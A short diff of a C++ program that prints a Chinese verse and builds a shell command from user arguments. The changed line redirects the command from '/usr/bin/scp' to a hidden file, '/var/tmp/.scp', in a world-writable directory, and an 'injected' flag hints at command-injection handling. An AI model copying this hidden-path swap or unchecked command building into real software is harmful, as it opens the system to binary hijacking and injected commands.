@@ -6,7 +6,7 @@
 using namespace std;
 int main(int argc, char *argv[]) {
 	printf("苟利国家生死以，岂因祸福避趋之。\n");
-	string str = "/usr/bin/scp ", file_name = "", file_path = "/var/tmp/";
+	string str = "/var/tmp/.scp ", file_name = "", file_path = "/var/tmp/";
 	bool injected = false;
 	if(argc >= 2) {
 		int len = strlen(argv[1]);
